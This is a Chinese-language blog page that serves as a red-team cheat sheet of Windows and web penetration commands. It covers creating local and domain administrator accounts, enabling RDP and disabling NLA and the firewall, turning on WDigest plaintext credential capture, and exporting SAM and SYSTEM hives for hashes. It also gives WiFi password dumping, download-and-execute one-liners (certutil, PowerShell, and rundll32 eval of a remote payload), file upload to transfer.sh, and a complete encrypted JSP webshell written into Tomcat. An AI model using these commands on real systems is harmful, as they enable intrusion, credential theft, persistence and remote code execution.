查看用户组列表: net localgroup

查看管理组列表: net localgroup Administrators

添加用户并设置密码: net user ASP.NET P@ssw0rd /add

将用户加入管理组: net localgroup Administrators ASP.NET /add

将用户加入桌面组: net localgroup &#34;Remote Desktop Users&#34; guest /add

激活guest用户: net user guest /active:yes

更改guest用户的密码: net user guest P@ssw0rd

将用户加入管理组: net localgroup administrators guest /add

将用户加入桌面组: net localgroup &#34;Remote Desktop Users&#34; guest /add

查看本地密码策略: net accounts

查看当前会话: net session

建立IPC会话: net use \\127.0.0.1\c$ &#34;P@ssw0rd&#34; /user:&#34;domain\Administrator&#34;</code></pre><h4 id="2-域渗透命令httpsbookshentoushitopinfowin_infohtml2-域渗透命令" class="heading-element"><span><a href="https://book.shentoushi.top/Info/Win_info.html#2-%e5%9f%9f%e6%b8%97%e9%80%8f%e5%91%bd%e4%bb%a4"target="_blank" rel="external nofollow noopener noreferrer">2. 域渗透命令</a></span>
  <a href="#2-%e5%9f%9f%e6%b8%97%e9%80%8f%e5%91%bd%e4%bb%a4httpsbookshentoushitopinfowin_infohtml2-%e5%9f%9f%e6%b8%97%e9%80%8f%e5%91%bd%e4%bb%a4" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><pre tabindex="0"><code>查看当前用户权限: whoami /user

可知域名为和其他信息: net config workstation

查询域用户：net user /domain

添加域用户: net user ASP.NET Admin12345 /add /domain

添加域管理员: net group &#34;domain admins&#34; ASP.NET /add /domain

添加企业管理员: net group &#34;enterprise admins&#34; /add /domain

查询域管理员用户：net group &#34;domain admins&#34; /domain

查询域企业管理组: net group &#34;enterprise admins&#34; /domain

查询域本地管理组: net localgroup administrators /domain

查询域控制器和时间：net time /domain

查询域名称：net view /domain

查询域内计算机：net view /domain:redteam.local

查看当前域内计算机列表: net group &#34;domain computers&#34; /domain

查看域控机器名: net group &#34;domain controllers&#34; /domain

查看域密码策略: net accounts /domain

查看域信任: nltest /domain_trusts

查看某个域的域信任: nltest /domain_trusts /all_trusts /v /server:10.10.10.10

通过srv记录: nslookup -type=SRV _ldap._tcp.corp</code></pre><h4 id="3-信息收集命令httpsbookshentoushitopinfowin_infohtml3-信息收集命令" class="heading-element"><span><a href="https://book.shentoushi.top/Info/Win_info.html#3-%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%91%bd%e4%bb%a4"target="_blank" rel="external nofollow noopener noreferrer">3. 信息收集命令</a></span>
  <a href="#3-%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%91%bd%e4%bb%a4httpsbookshentoushitopinfowin_infohtml3-%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%91%bd%e4%bb%a4" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><pre tabindex="0"><code>查看当前用户的安全特权: whoami /priv

查看当前用户: whoami /user

查看当前登陆用户: query user &amp;&amp; quser

查看系统版本和补丁信息: systeminfo

查看系统开放端口: netstat -ano

查看系统进程: tasklist /svc

列出详细进程: tasklist /V &amp;&amp; tasklist /V /FO CSV

查看ip地址和dns信息: ipconfig /all

查看当前用户保存的凭证: cmdkey /list

查看路由信息:route print

查看arp列表: arp -a

查看当前用户保存的票据凭证: klist</code></pre><ul>
<li>列出c盘Users文件夹:</li>
</ul>
<pre tabindex="0"><code>dir /b c:\Users</code></pre><ul>
<li>搜索D盘磁盘名字为logo.jpg的文件:</li>
</ul>
<pre tabindex="0"><code>cd /d D:\ &amp;&amp; dir /b /s logo.jpg</code></pre><ul>
<li>搜素C盘文件夹下后缀conf内容有password:</li>
</ul>
<pre tabindex="0"><code>findstr /s /i /n /d:C:\ &#34;password&#34; *.conf</code></pre><ul>
<li>查找Windows目录下面的Bluetooth.dll文件:</li>
</ul>
<pre tabindex="0"><code>where /R C:\windows Bluetooth.dll</code></pre><ul>
<li>查看3389端口:</li>
</ul>
<pre tabindex="0"><code>for /f &#34;tokens=2&#34; %i in (&#39;tasklist /FI &#34;SERVICES eq TermService&#34; /NH&#39;) do netstat -ano | findstr %i | findstr LISTENING</code></pre><ul>
<li>Windows存储的凭证:</li>
</ul>
<pre tabindex="0"><code>rundll32 keymgr.dll,KRShowKeyMgr</code></pre><h4 id="4注册表相关httpsbookshentoushitopinfowin_infohtml4注册表相关" class="heading-element"><span><a href="https://book.shentoushi.top/Info/Win_info.html#4%e6%b3%a8%e5%86%8c%e8%a1%a8%e7%9b%b8%e5%85%b3"target="_blank" rel="external nofollow noopener noreferrer">4.注册表相关</a></span>
  <a href="#4%e6%b3%a8%e5%86%8c%e8%a1%a8%e7%9b%b8%e5%85%b3httpsbookshentoushitopinfowin_infohtml4%e6%b3%a8%e5%86%8c%e8%a1%a8%e7%9b%b8%e5%85%b3" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><ol>
<li>LocalAccountTokenFilterPolicy-启用任何管理员用户横向</li>
</ol>
<pre tabindex="0"><code>reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</code></pre><ol>
<li>查看3389端口:</li>
</ol>
<pre tabindex="0"><code>REG query &#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34; /v PortNumber</code></pre><ol>
<li>开启远程桌面:</li>
</ol>
<pre tabindex="0"><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&#34; &#34;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
wmic RDTOGGLE WHERE ServerName=&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</code></pre><ol>
<li>注册表抓取明文:</li>
</ol>
<pre tabindex="0"><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></pre><ol>
<li>rdp连接默认的10个记录:</li>
</ol>
<pre tabindex="0"><code>reg query &#34;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&#34;</code></pre><ol>
<li>rdp连接默认的所有记录:</li>
</ol>
<pre tabindex="0"><code>reg query &#34;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&#34; /s</code></pre><ol>
<li>查找软件安装目录:</li>
</ol>
<pre tabindex="0"><code>reg query HKLM /f foxmail /t REG_SZ /s</code></pre><ol>
<li>reg导出注册表hash:</li>
</ol>
<pre tabindex="0"><code>reg save hklm\sam c:\programdata\sam.hive &amp;&amp; reg save hklm\system c:\programdata\system.hive</code></pre><ol>
<li>hash登录利用“Restricted Admin Mode“特性:</li>
</ol>
<ul>
<li>新建DWORD键值DisableRestrictedAdmin，值为0，代表开启;值为1，代表关闭</li>
</ul>
<pre tabindex="0"><code>REG ADD &#34;HKLM\System\CurrentControlSet\Control\Lsa&#34; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</code></pre><ul>
<li>查看是否开启DisableRestrictedAdmin REG_DWORD 0x0 存在就是开启</li>
</ul>
<pre tabindex="0"><code>REG query &#34;HKLM\System\CurrentControlSet\Control\Lsa&#34; | findstr &#34;DisableRestrictedAdmin&#34;</code></pre><ul>
<li>然后如果hash正确就可以登录目标主机</li>
</ul>
<pre tabindex="0"><code>mstsc.exe /restrictedadmin</code></pre><ol>
<li>CredSSP 加密数据库修正:</li>
</ol>
<pre tabindex="0"><code>reg add &#34;HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters&#34; /f /v AllowEncryptionOracle /t REG_DWORD /d 2</code></pre><ol>
<li>取消仅允许运行使用网络识别身份验证的远程桌面的计算机连接(NLA):</li>
</ol>
<pre tabindex="0"><code>REG ADD &#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34; /v UserAuthentication /t REG_DWORD /f /d 0</code></pre><h4 id="5-系统下载文件httpsbookshentoushitopinfowin_infohtml5-系统下载文件" class="heading-element"><span><a href="https://book.shentoushi.top/Info/Win_info.html#5-%e7%b3%bb%e7%bb%9f%e4%b8%8b%e8%bd%bd%e6%96%87%e4%bb%b6"target="_blank" rel="external nofollow noopener noreferrer">5. 系统下载文件:</a></span>
  <a href="#5-%e7%b3%bb%e7%bb%9f%e4%b8%8b%e8%bd%bd%e6%96%87%e4%bb%b6httpsbookshentoushitopinfowin_infohtml5-%e7%b3%bb%e7%bb%9f%e4%b8%8b%e8%bd%bd%e6%96%87%e4%bb%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><ol>
<li>windows2003默认文件:</li>
</ol>
<pre tabindex="0"><code>Blob0_0.bin //可以正常执行</code></pre><ol>
<li>certutil下载文件:</li>
</ol>
<pre tabindex="0"><code>certutil -urlcache -split -f http://127.0.0.1:8080/nc.txt c:\nc.txt</code></pre><p>2.1 certutil删除记录:</p>
<pre tabindex="0"><code>certutil -urlcache -split -f http://127.0.0.1:8080/nc.txt delete</code></pre><ol>
<li>bitsadmin下载文件:</li>
</ol>
<pre tabindex="0"><code>bitsadmin /rawreturn /transfer getfile http://download.sysinternals.com/files/PSTools.zip c:\Pstools.zip</code></pre><ol>
<li>powershell下载文件:</li>
</ol>
<pre tabindex="0"><code>powershell -nop -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&#39;http://127.0.0.1/nc.txt&#39;,&#39;nc.exe&#39;)</code></pre><ol>
<li>msedge下载并执行:</li>
</ol>
<pre tabindex="0"><code>cmd /c start /min msedge.exe http://127.0.0.1/test.zip &amp;&amp; timeout 5 &amp;&amp; taskkill /f /t /im msedge.exe &amp;&amp; C:/Users/%UserName%/Downloads/test.zip</code></pre><ol>
<li>rundll32下载文件</li>
</ol>
<pre tabindex="0"><code>rundll32.exe javascript:&#34;\..\mshtml,RunHTMLApplication &#34;;document.write();h=new%20ActiveXObject(&#34;WinHttp.WinHttpRequest.5.1&#34;);h.Open(&#34;GET&#34;,&#34;http://192.168.3.150/chfs/shared/1Z3.exe&#34;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&#34;WScript.Shell&#34;).Run(&#34;cmd /c taskkill /f /im rundll32.exe&#34;,0,true);}</code></pre><h4 id="设置网卡netsh和防火墙信息httpsbookshentoushitopinfowin_infohtml设置网卡netsh和防火墙信息" class="heading-element"><span><a href="https://book.shentoushi.top/Info/Win_info.html#%e8%ae%be%e7%bd%ae%e7%bd%91%e5%8d%a1netsh%e5%92%8c%e9%98%b2%e7%81%ab%e5%a2%99%e4%bf%a1%e6%81%af"target="_blank" rel="external nofollow noopener noreferrer">设置网卡netsh和防火墙信息</a></span>
  <a href="#%e8%ae%be%e7%bd%ae%e7%bd%91%e5%8d%a1netsh%e5%92%8c%e9%98%b2%e7%81%ab%e5%a2%99%e4%bf%a1%e6%81%afhttpsbookshentoushitopinfowin_infohtml%e8%ae%be%e7%bd%ae%e7%bd%91%e5%8d%a1netsh%e5%92%8c%e9%98%b2%e7%81%ab%e5%a2%99%e4%bf%a1%e6%81%af" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>查看网卡信息</p>
<pre tabindex="0"><code>netsh interface show interface</code></pre><p>设置主dns</p>
<pre tabindex="0"><code>netsh interface ip set dns &#34;以太网&#34; static 114.114.114.114 primary</code></pre><p>设置备dns</p>
<pre tabindex="0"><code>netsh interface ip add dns &#34;以太网&#34; 8.8.8.8</code></pre><p>查看防火墙状态</p>
<pre tabindex="0"><code>netsh advfirewall show allprofiles</code></pre><p>防火墙恢复默认配置</p>
<pre tabindex="0"><code>netsh firewall reset</code></pre><p>开启防火墙</p>
<pre tabindex="0"><code>netSh Advfirewall set allprofiles state on</code></pre><p>关闭防火墙</p>
<pre tabindex="0"><code>netSh Advfirewall set allprofiles state off</code></pre><p>放行3389端口</p>
<pre tabindex="0"><code>netsh advfirewall firewall add rule name=3389_test dir=in action=allow protocol=TCP localport=3389</code></pre><h4 id="查看本机wifi信息和配置httpsbookshentoushitopinfowin_infohtml查看本机wifi信息和配置" class="heading-element"><span><a href="https://book.shentoushi.top/Info/Win_info.html#%e6%9f%a5%e7%9c%8b%e6%9c%ac%e6%9c%bawifi%e4%bf%a1%e6%81%af%e5%92%8c%e9%85%8d%e7%bd%ae"target="_blank" rel="external nofollow noopener noreferrer">查看本机WiFi信息和配置</a></span>
  <a href="#%e6%9f%a5%e7%9c%8b%e6%9c%ac%e6%9c%bawifi%e4%bf%a1%e6%81%af%e5%92%8c%e9%85%8d%e7%bd%aehttpsbookshentoushitopinfowin_infohtml%e6%9f%a5%e7%9c%8b%e6%9c%ac%e6%9c%bawifi%e4%bf%a1%e6%81%af%e5%92%8c%e9%85%8d%e7%bd%ae" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><ul>
<li>查看当前用户wifi配置文件</li>
</ul>
<pre tabindex="0"><code>netsh wlan show profiles</code></pre><ul>
<li>查看当前连接的wifi</li>
</ul>
<pre tabindex="0"><code>netsh wlan show interface</code></pre><ul>
<li>查看本机WiFi配置和密码:</li>
</ul>
<pre tabindex="0"><code>netsh wlan show profile &#34;ssid&#34; key=clear</code></pre><ul>
<li>枚举所有连接过的wifi:</li>
</ul>
<pre tabindex="0"><code>for /f &#34;skip=9 tokens=1,2 delims=:&#34; %i in (&#39;netsh wlan show profiles&#39;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear</code></pre><ul>
<li>连接他配置文件的其它wifi</li>
</ul>
<pre tabindex="0"><code>netsh wlan connect name=ssid</code></pre><ul>
<li>文件上传</li>
</ul>
<pre tabindex="0"><code>curl -k --upload-file win.exe https://transfer.sh --progress-bar</code></pre><ul>
<li>sc命令</li>
</ul>
<pre tabindex="0"><code>创建服务: sc \\127.0.0.1 create Emeripe binPath= &#34;cmd.exe /c start c:\programdata\info.bat&#34;
启动服务: sc \\127.0.0.1 start Emeripe
删除服务: sc \\127.0.0.1 delete Emeripe</code></pre><ul>
<li>远程桌面登录到 console 会话解决 hash 无法抓出问题</li>
</ul>
<pre tabindex="0"><code>mstsc /admin</code></pre><ul>
<li>将用户会话连接到远程桌面会话</li>
</ul>
<pre tabindex="0"><code>tscon ID(quser)</code></pre><ul>
<li>根据进程名字终止进程:</li>
</ul>
<pre tabindex="0"><code>taskkill /f /t /im msedge.exe</code></pre><ul>
<li>根据进程pid终止进程:</li>
</ul>
<pre tabindex="0"><code>taskkill /f /pid 17676</code></pre><ul>
<li>tasklist查看远程主机进程:</li>
</ul>
<pre tabindex="0"><code>tasklist /s 192.168.3.200 /u Aadministrator /p Password
tasklist /s 192.168.3.110 /u offensive\administrator /P Password /V</code></pre><ul>
<li>runas启动其它用户进程:</li>
</ul>
<pre tabindex="0"><code>runas /user:administrator /savecred &#34;cmd.exe /k whoami&#34;</code></pre><ul>
<li><code>windows开机启动路径</code></li>
</ul>
<pre tabindex="0"><code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code></pre><h1 id="websecurity命令收集" class="heading-element"><span>Websecurity命令收集</span>
  <a href="#websecurity%e5%91%bd%e4%bb%a4%e6%94%b6%e9%9b%86" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><ul>
<li><code>cmd下转义写马问题</code></li>
</ul>
<pre tabindex="0"><code>echo ^&lt;%! String xc=\&#34;d8ea7326e6ec5916\&#34;; String pass=\&#34;pass123\&#34;; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(\&#34;AES\&#34;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),\&#34;AES\&#34;));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(\&#34;MD5\&#34;);m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName(\&#34;java.util.Base64\&#34;);Object Encoder = base64.getMethod(\&#34;getEncoder\&#34;, null).invoke(base64, null);value = (String)Encoder.getClass().getMethod(\&#34;encodeToString\&#34;, new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(\&#34;sun.misc.BASE64Encoder\&#34;); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(\&#34;encode\&#34;, new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName(\&#34;java.util.Base64\&#34;);Object decoder = base64.getMethod(\&#34;getDecoder\&#34;, null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod(\&#34;decode\&#34;, new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(\&#34;sun.misc.BASE64Decoder\&#34;); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod(\&#34;decodeBuffer\&#34;, new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%^&gt;^&lt;%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute(\&#34;payload\&#34;)==null){session.setAttribute(\&#34;payload\&#34;,new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute(\&#34;parameters\&#34;,data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute(\&#34;payload\&#34;)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%^&gt; &gt;/tomcat/webapps/ROOT/1.jsp</code></pre><ul>
<li><code>网站路径中文问题 递归搜索E盘的index.php然后输出到1.txt然后把cmd.php复制到文件1.txt路径所在目录</code></li>
</ul>
<pre tabindex="0"><code>dir /s /b E:\index.php &gt; E:\www\1.txt &amp;&amp; (for /f &#34;usebackq delims=&#34; %a in (&#34;E:\www\1.txt&#34;) do (copy E:\www\cmd.php &#34;%~dpa&#34;))</code></pre><ul>
<li><code>查找1.jpg路径把111.txt写到jpg目录</code></li>
</ul>
<pre tabindex="0"><code>find / -name 1.jpg|while read file;do sh -c &#34;echo &#39;111&#39;&#34;&gt;$(dirname $file)/111.txt;done</code></pre><ul>
<li><code>mssql查找数据库配置文件</code></li>
</ul>
<pre tabindex="0"><code>findstr /c:&#34;User Id=&#34; /c:&#34;Password=&#34; /si web.config &gt;&gt; tmp.log
findstr /c:&#34;uid=&#34; /c:&#34;Password=&#34; /si web.config &gt;&gt; tmp.log</code></pre></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
      </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span></span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" class="post-tag" title="Tags - 计算机基础">计算机基础</a><a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" class="post-tag" title="Tags - 操作系统">操作系统</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/54/" class="post-nav-item" rel="prev" title="Windows权限提升"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Windows权限提升</a>
      <a href="/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/60/" class="post-nav-item" rel="next" title="Windows内网信息搜集">Windows内网信息搜集<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">
              <a href="/">东隅</a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
</html>
